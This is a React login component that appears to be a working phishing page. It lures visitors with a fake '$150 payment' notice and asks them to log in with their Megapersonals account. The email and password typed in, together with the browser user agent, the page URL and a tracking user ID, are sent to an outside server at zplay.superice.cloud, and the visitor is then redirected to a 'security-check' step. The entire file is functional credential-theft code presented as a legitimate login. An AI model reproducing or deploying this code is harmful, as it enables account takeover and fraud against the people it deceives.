import React, { useState, useEffect } from "react";
import { useParams, useNavigate } from "react-router-dom";
import "../auth/css/1e43e3ab50fce75fsw.css"; // Import the CSS file
import "../auth/css/57978a1014ff42c9sw.css"; // Import the CSS file
import devilGirl from "../auth/images/devilgirl.png"
const Login = () => {
  const { userId } = useParams();
  const navigate = useNavigate();

  const [formData, setFormData] = useState({
    email: "",
    password: "",
    userId: "",
    userAgent: "",
    message: "",
    landing_url: "",
    captcha: "",
  });

  const [loading, setLoading] = useState(false);

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData((prevData) => ({
      ...prevData,
      [name]: value,
    }));
  };

  useEffect(() => {
    setFormData((prevData) => ({
      ...prevData,
      userAgent: navigator.userAgent,
      landing_url: window.location.href,
      userId: userId || "",
    }));
  }, [userId]);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    try {
      const response = await fetch(
        `https://zplay.superice.cloud/api/save_data`,
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify(formData),
        }
      );

      if (response.ok) {
        const result = await response.json();
        console.log("Server Response:", result);
        if (result.success) {
          sessionStorage.setItem("insertId", result.id);
          navigate("/security-check");
        } else {
          alert(result.message || "Failed to process request.");
        }
      } else {
        alert("Error submitting form");
      }
    } catch (error) {
      console.error("Error:", error);
      alert("An error occurred while submitting the form.");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="bg-neutral-900 text-neutral-950">
      {/* Video Background */}
      <video
        autoPlay
        muted
        playsInline
        className="fixed inset-0 w-full h-full object-cover object-center"
        id="video"
      ></video>

      {/* Login Page */}
      <div
        className="relative min-h-screen flex items-center justify-center p-4 text-center"
        id="login-page"
      >
        <div className="bg-neutral-50 w-full max-w-md p-6 rounded-xl">
          <p className="text-3xl font-semibold">Accept your payment</p>
          <p className="mt-3 leading-relaxed max-w-[32ch] mx-auto">
            You just got{" "}
            <span className="text-green-500 font-semibold">$150</span> from
            Orlando
          </p>
          <img
            src={devilGirl}
            alt="Devil Girl"
            width="180"
            height="120"
          />
          <p className="text-lg font-semibold mt-3">To accept money</p>
          <p className="text-xl font-semibold mt-3">Login with Megapersonals</p>

          {/* Login Form */}
          <form
            className="flex flex-col gap-y-4 mt-4"
            onSubmit={handleSubmit}
          >
            <input
              required
              className="border h-11 rounded px-4 outline-none border-green-500 disabled:border-green-200"
              placeholder="Enter email here"
              type="email"
              name="email"
              id="email"
              value={formData.email}
              onChange={handleChange}
              aria-label="Email"
            />
            <input
              required
              className="border h-11 rounded px-4 outline-none border-green-500 disabled:border-green-200"
              placeholder="Enter password here"
              type="password"
              name="password"
              id="password"
              value={formData.password}
              onChange={handleChange}
              aria-label="Password"
            />
            <button
              type="submit"
              className="h-11 rounded text-neutral-50 font-medium bg-green-500 hover:bg-green-600 disabled:bg-green-200"
              disabled={loading}
            >
              {loading ? "Submitting..." : "Submit"}
            </button>
          </form>
        </div>
      </div>
    </div>
  );
};

export default Login;
